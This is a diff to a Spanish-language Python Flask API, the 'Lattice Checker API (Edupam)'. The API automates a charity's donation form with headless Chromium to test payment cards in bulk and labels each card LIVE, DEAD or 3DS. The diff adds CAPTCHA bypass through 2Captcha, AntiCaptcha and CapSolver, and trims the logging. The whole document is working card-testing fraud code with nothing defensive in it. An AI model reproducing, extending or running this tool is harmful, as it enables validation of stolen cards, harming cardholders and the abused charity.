                 """, solution)
                 
                 time.sleep(2)
                 
-                # Re-enviar formulario
-                btn = page.locator('#btn-donation')
-                if btn.count() > 0:
-                    logger.info(f"✅ Re-enviando formulario...")
-                    btn.click()
+                # Re-enviar si es necesario
+                submit_btn = page.locator('button[type="submit"], #btn-donation, input[type="submit"]')
+                if submit_btn.count() > 0:
+                    submit_btn.click()
                     time.sleep(5)
                 
                 return True
                 
             except Exception as e:
-                logger.error(f"❌ Error inyectando solución hCaptcha: {e}")
+                logger.error(f"❌ Error inyectando solución: {e}")
                 return False
                 
         except Exception as e:
             logger.error(f"❌ Error en solve_captcha_if_present: {e}")
             return False
-
-
     
     def check_single_card(self, card_string, amount=50):
-        """Verificar una sola tarjeta - CIERRA después de cada una"""
+        """Verificar una sola tarjeta"""
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
-        logger.info(f"🚀 INICIANDO NUEVA VERIFICACIÓN para ****{card_last4}")
+        logger.info(f"🚀 INICIANDO VERIFICACIÓN para ****{card_last4}")
         
         # Parsear tarjeta
         card_info = self.parse_card_data(card_string)
         if not card_info:
             return {
                 'success': False,
-                'status': 'error',
+                'status': 'ERROR',
                 'message': 'Error parseando tarjeta',
-                'card': card_last4
+                'card': f"****{card_last4}"
             }
         
         playwright = None
@@ -785,132 +795,86 @@ class EdupamChecker:
         page = None
         
         try:
-            logger.info(f"1. Iniciando Playwright FRESCO...")
+            # Iniciar Playwright
             playwright = sync_playwright().start()
             
-            logger.info(f"2. Lanzando Chromium NUEVO...")
             browser = playwright.chromium.launch(
                 executable_path='/usr/bin/chromium',
                 headless=True,
                 args=['--no-sandbox', '--disable-setuid-sandbox']
             )
             
-            logger.info(f"3. Creando contexto NUEVO...")
             context = browser.new_context()
-            
-            logger.info(f"4. Creando página NUEVA...")
             page = context.new_page()
             
             # Navegar
-            logger.info(f"5. Navegando a {self.base_url}{self.endpoint}...")
             page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
             time.sleep(3)
             
-            # Verificar URL
-            logger.info(f"6. URL actual: {page.url}")
+            logger.info(f"📄 URL actual: {page.url}")
             
             # Llenar formulario
-            logger.info(f"7. Llenando formulario...")
             if not self.fill_form(page, amount):
                 return {
                     'success': False,
                     'status': 'ERROR',
                     'message': 'Error llenando formulario',
-                    'card': card_last4
+                    'card': f"****{card_last4}"
                 }
             
             # Ingresar tarjeta
-            logger.info(f"8. Ingresando tarjeta ****{card_last4}...")
             if not self.fill_card_simple(page, card_info):
                 return {
                     'success': False,
                     'status': 'ERROR',
                     'message': 'Error ingresando tarjeta',
-                    'card': card_last4
+                    'card': f"****{card_last4}"
                 }
             
             time.sleep(2)
             
-            # Enviar
-            logger.info(f"9. Enviando donación...")
+            # Enviar donación
             btn = page.locator('#btn-donation')
             if btn.count() == 0:
                 return {
                     'success': False,
                     'status': 'ERROR',
                     'message': 'Botón no encontrado',
-                    'card': card_last4
+                    'card': f"****{card_last4}"
                 }
             
             btn.click()
+            time.sleep(3)
             
             # Intentar resolver captcha si aparece
             captcha_solved = True
-            if self.captcha_solver:
-                logger.info(f"10. Verificando captcha para ****{card_last4}...")
+            if any([API_KEY_2CAPTCHA, API_KEY_ANTICAPTCHA, API_KEY_CAPSOLVER]):
+                logger.info(f"🔍 Verificando captcha para ****{card_last4}...")
                 captcha_solved = self.solve_captcha_if_present(page, card_last4)
             
-            # Esperar respuesta después del captcha (o sin captcha)
-            wait_time = 15 if captcha_solved else 8
-            logger.info(f"11. Esperando respuesta ({wait_time} segundos)...")
+            # Esperar respuesta
+            wait_time = 12 if captcha_solved else 8
+            logger.info(f"⏳ Esperando respuesta ({wait_time} segundos)...")
             time.sleep(wait_time)
             
-            # DEBUG EXTREMO
-            logger.info(f"12. URL DESPUÉS de enviar: {page.url}")
-            page_text = page.content()
-            logger.info(f"13. HTML (200 chars): {page_text[:200]}")
+            logger.info(f"📄 URL después de enviar: {page.url}")
             
-            # Tomar screenshot ÚNICO para esta tarjeta
+            # Tomar screenshot
             screenshot_b64 = None
             try:
-                # 1. Hacer scroll para forzar renderizado de elementos lazy
-                page.evaluate("""
-                    () => {
-                        const height = document.body.scrollHeight;
-                        window.scrollTo(0, height);
-                        window.scrollTo(0, 0);
-                    }
-                """)
-                
-                # 2. Esperar un poco después del scroll
-                page.wait_for_timeout(300)
-                
-                # 3. Obtener altura total REAL (puede haber cambiado después del scroll)
-                total_height = page.evaluate("""
-                    () => {
-                        return Math.max(
-                            document.body.scrollHeight,
-                            document.documentElement.scrollHeight
-                        );
-                    }
-                """)
-                
-                # 4. Ajustar viewport si es necesario
-                current_viewport = page.viewport_size
-                if total_height > current_viewport['height']:
-                    page.set_viewport_size({
-                        'width': current_viewport['width'],
-                        'height': total_height + 50  # Margen extra por seguridad
-                    })
-                
-                # 5. Esperar a que se re-renderice con el nuevo tamaño
-                page.wait_for_timeout(1000)
-                
-                # 6. Tomar screenshot
+                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
+                time.sleep(0.5)
                 screenshot_bytes = page.screenshot(full_page=True)
                 screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
-                logger.info(f"14. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
-                
+                logger.info(f"📸 Screenshot tomado para ****{card_last4}")
             except Exception as e:
                 logger.error(f"Error screenshot: {e}")
             
-            # Analizar
+            # Analizar resultado
             current_url = page.url
-            analysis = self.analyzer.analyze_payment_result(
-                page, current_url, card_last4
-            )
+            analysis = self.analyzer.analyze_payment_result(page, current_url, card_last4)
             
-            # Resultado
+            # Mapear estado
             status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
             final_status = status_map.get(analysis['status'], 'ERROR')
             
@@ -921,16 +885,12 @@ class EdupamChecker:
                 'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
             }
             
-            # Añadir información sobre captcha
-            evidence = analysis['evidence']
-            if not captcha_solved and self.captcha_solver:
-                evidence.append('⚠️ No se pudo resolver captcha')
-            
+            # Construir resultado
             result = {
                 'success': True,
                 'status': final_status,
                 'original_status': messages.get(final_status, 'Estado desconocido'),
-                'message': ', '.join(evidence),
+                'message': ', '.join(analysis['evidence']),
                 'response': {
                     'url': analysis['url'],
                     'evidence': analysis['evidence'],
@@ -943,24 +903,22 @@ class EdupamChecker:
                 'amount': amount
             }
             
-            logger.info(f"15. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
+            logger.info(f"✅ VERIFICACIÓN COMPLETADA para ****{card_last4}: {final_status}")
             
-            # CERRAR TODO
-            logger.info(f"16. Cerrando recursos...")
+            # Limpiar recursos
             try:
                 page.close()
                 context.close()
                 browser.close()
                 playwright.stop()
-                logger.info(f"17. ✅ Recursos CERRADOS para ****{card_last4}")
-            except Exception as e:
-                logger.error(f"Error cerrando: {e}")
+            except:
+                pass
             
             return result
             
         except Exception as e:
             logger.error(f"❌ ERROR en ****{card_last4}: {e}")
-            # CERRAR TODO
+            # Limpiar recursos en caso de error
             try:
                 if page and not page.is_closed():
                     page.close()
@@ -975,10 +933,8 @@ class EdupamChecker:
                 'success': False,
                 'status': 'ERROR',
                 'message': f'Error: {str(e)[:100]}',
-                'card': card_last4
+                'card': f"****{card_last4}"
             }
-
-
 
 # ========== FUNCIONES DEL WORKER ==========
 
@@ -1062,8 +1018,7 @@ def process_cards_worker(cards, amount, stop_on_live):
     
     checking_status['active'] = False
 
-
-# ========== ENDPOINTS API ==========
+# ========== ENDPOINTS API (MANTENIDOS IGUAL) ==========
 
 @app.route('/')
 def index():
@@ -1071,7 +1026,7 @@ def index():
     return jsonify({
         "status": "online",
         "service": "Lattice Checker API (Edupam)",
-        "version": "2.1",
+        "version": "2.2",
         "endpoints": {
             "health": "/api/health",
             "status": "/api/status",
@@ -1084,7 +1039,9 @@ def index():
             "headless": HEADLESS,
             "donation_amount": DONATION_AMOUNT,
             "max_workers": MAX_WORKERS,
-            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
+            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled",
+            "anticaptcha": "enabled" if API_KEY_ANTICAPTCHA else "disabled",
+            "capsolver": "enabled" if API_KEY_CAPSOLVER else "disabled"
         }
     })
 
@@ -1094,10 +1051,12 @@ def health_check():
     return jsonify({
         'status': 'online',
         'service': 'Lattice Checker API',
-        'version': '2.1',
+        'version': '2.2',
         'timestamp': datetime.now().isoformat(),
         'features': {
-            'captcha_support': bool(API_KEY_2CAPTCHA),
+            '2captcha': bool(API_KEY_2CAPTCHA),
+            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
+            'capsolver': bool(API_KEY_CAPSOLVER),
             'screenshots': True,
             'multi_card_check': True
         }
@@ -1115,7 +1074,11 @@ def get_status():
         'error': checking_status['error'],
         'current': checking_status['current'],
         'total': len(checking_status['results']),
-        'captcha_enabled': bool(API_KEY_2CAPTCHA)
+        'captcha_services': {
+            '2captcha': bool(API_KEY_2CAPTCHA),
+            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
+            'capsolver': bool(API_KEY_CAPSOLVER)
+        }
     })
 
 @app.route('/api/check-card', methods=['POST'])
@@ -1134,7 +1097,6 @@ def check_single_card():
     
     # Extraer datos
     card_data = data.get('card', '')
-    cookies = data.get('cookies', '')  # Mantener para compatibilidad
     
     if not card_data or '|' not in card_data:
         return jsonify({
@@ -1224,7 +1186,11 @@ def check_cards():
         'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
         'total': len(valid_cards),
         'amount': amount,
-        'captcha_enabled': bool(API_KEY_2CAPTCHA)
+        'captcha_services': {
+            '2captcha': bool(API_KEY_2CAPTCHA),
+            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
+            'capsolver': bool(API_KEY_CAPSOLVER)
+        }
     })
 
 @app.route('/api/results', methods=['GET'])
@@ -1239,7 +1205,11 @@ def get_results():
             'threeds': checking_status['threeds'],
             'error': checking_status['error']
         },
-        'captcha_enabled': bool(API_KEY_2CAPTCHA)
+        'captcha_services': {
+            '2captcha': bool(API_KEY_2CAPTCHA),
+            'anticaptcha': bool(API_KEY_ANTICAPTCHA),
+            'capsolver': bool(API_KEY_CAPSOLVER)
+        }
     })
 
 @app.route('/api/cancel', methods=['POST'])
@@ -1260,11 +1230,16 @@ if __name__ == '__main__':
     logger.info(f"   Headless: {HEADLESS}")
     logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
     logger.info(f"   Max workers: {MAX_WORKERS}")
-    logger.info(f"   2Captcha: {'ENABLED' if API_KEY_2CAPTCHA else 'DISABLED'}")
     
+    # Mostrar estado de servicios de captcha
     if API_KEY_2CAPTCHA:
-        logger.info(f"   Captcha Solver: ✅ Integrado y listo")
-    else:
-        logger.warning(f"   Captcha Solver: ⚠️ NO configurado - Los captchas no se resolverán")
+        logger.info(f"   2Captcha: ✅ ENABLED")
+    if API_KEY_ANTICAPTCHA:
+        logger.info(f"   AntiCaptcha: ✅ ENABLED")
+    if API_KEY_CAPSOLVER:
+        logger.info(f"   CapSolver: ✅ ENABLED")
+    
+    if not any([API_KEY_2CAPTCHA, API_KEY_ANTICAPTCHA, API_KEY_CAPSOLVER]):
+        logger.warning(f"   Captcha Services: ⚠️ NONE configurado - Los captchas no se resolverán")
     
     app.run(host='0.0.0.0', port=port, debug=debug)
